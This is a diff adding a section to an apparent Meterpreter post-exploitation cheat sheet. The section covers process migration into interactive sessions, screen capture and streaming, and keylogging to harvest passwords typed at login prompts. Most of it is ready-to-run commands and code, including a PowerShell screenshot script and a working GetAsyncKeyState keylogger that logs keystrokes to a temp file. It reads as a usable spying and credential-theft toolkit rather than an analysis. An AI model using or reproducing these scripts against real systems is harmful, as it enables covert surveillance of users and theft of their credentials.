@@ -353,6 +353,91 @@ meterpreter > impersonate_token "DOMAIN\\Administrator"
 meterpreter > rev2self
 ```
 
+### Screenshare / Keylogging / Interactive Session Spying
+
+Migrate into a Session-1 (console-interactive) process to capture credentials as they are typed into RDP, runas prompts, or GUI applications. The target process must run in the same session as the interactive desktop.
+
+```text
+# Identify session-1 interactive processes (look for Session column = 1)
+meterpreter > ps
+# Typical targets: explorer.exe, winlogon.exe (session 1), mstsc.exe, credential-prompting apps
+
+# Migrate into an interactive desktop process for GUI/keyboard access
+meterpreter > migrate -N explorer.exe
+# Or by PID if multiple explorer instances exist
+meterpreter > migrate <PID>
+
+# Live screen capture — single frame
+meterpreter > screenshot
+# Saves .jpeg to local loot dir; verify with: loot command in msfconsole
+
+# Live screen stream (real-time desktop view in browser)
+meterpreter > screenshare
+# Opens browser window streaming the target desktop via HTTP; Ctrl+C to stop
+
+# Keylogging — start capture, wait for user to type creds, then dump
+meterpreter > keyscan_start
+# Wait for target user activity (login prompt, runas, web form, etc.)
+meterpreter > keyscan_dump
+# Repeat keyscan_dump as needed to collect more keystrokes
+meterpreter > keyscan_stop
+```
+
+Full credential-spying workflow (migrate, screenshot to confirm login prompt, keylog the password):
+
+```text
+meterpreter > ps
+# Find winlogon.exe or LogonUI.exe in Session 1 → note <PID>
+meterpreter > migrate <PID>
+meterpreter > screenshot
+# Confirm target is at a login/credential prompt
+meterpreter > keyscan_start
+# Wait for user to authenticate...
+meterpreter > keyscan_dump
+# Output: typed username + password in cleartext
+meterpreter > keyscan_stop
+```
+
+#### Living-off-the-land / LOTL variant
+
+No pure LOTL equivalent exists for real-time screen streaming; however, keylogging and screenshots are achievable via PowerShell and native APIs from a SYSTEM shell without uploading tools.
+
+```powershell
+# Screenshot via .NET (runs from any PowerShell session with desktop access)
+Add-Type -AssemblyName System.Windows.Forms
+$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+$gfx = [System.Drawing.Graphics]::FromImage($bmp)
+$gfx.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bmp.Size)
+$bmp.Save("C:\Windows\Temp\ss.png")
+$gfx.Dispose(); $bmp.Dispose()
+```
+
+```powershell
+# Keylogger via GetAsyncKeyState (P/Invoke, no external binary)
+# Must run in the interactive session context (Session 1)
+$code = @'
+[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+'@
+$API = Add-Type -MemberDefinition $code -Name 'KL' -Namespace Win32 -PassThru
+$log = "C:\Windows\Temp\kl.txt"
+while ($true) {
+    for ($k = 8; $k -le 190; $k++) {
+        if ($API::GetAsyncKeyState($k) -eq -32767) {
+            $c = [char]$k; Add-Content -Path $log -Value $c -NoNewline
+        }
+    }
+    Start-Sleep -Milliseconds 30
+}
+# Retrieve later: type C:\Windows\Temp\kl.txt
+```
+
+```powershell
+# Query interactive sessions to find the right session ID before migrating/injecting
+query user
+# Or from cmd:
+qwinsta
+```
+
 ### Background Tasks / Scripts
 
 ```text
